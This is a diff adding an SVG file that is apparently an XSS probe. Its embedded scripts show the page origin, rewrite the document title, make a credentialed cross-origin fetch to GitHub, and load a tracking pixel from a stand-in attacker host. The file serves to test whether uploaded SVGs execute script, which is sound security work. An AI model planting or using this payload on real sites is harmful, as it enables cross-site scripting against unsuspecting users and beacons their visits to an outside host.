@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="120">
+  <rect width="200" height="120" fill="#1a1a2e"/>
+  <text x="10" y="40" fill="#0f0" font-size="14">XSS_PROBE</text>
+  <text x="10" y="70" fill="#0f0" font-size="12" id="out">pending</text>
+  <script type="text/javascript"><![CDATA[
+    var o = document.getElementById('out');
+    var msg = 'RAN origin=' + location.origin + ' domain=' + document.domain;
+    try { o.textContent = msg; } catch(e) {}
+    try { document.title = 'XSS_RAN_' + location.hostname; } catch(e) {}
+    try {
+      fetch('https://github.com/', {mode:'no-cors', credentials:'include'}).then(function(){
+        o.textContent = msg + ' fetched_github';
+      }).catch(function(e){ o.textContent = msg + ' fetch_err'; });
+    } catch(e) {}
+  ]]></script>
+  <script type="text/javascript">
+    document.title = 'XSS_RAN_RAW';
+  </script>
+  <image href="https://attacker.invalid/seen.png" width="1" height="1"/>
+</svg>
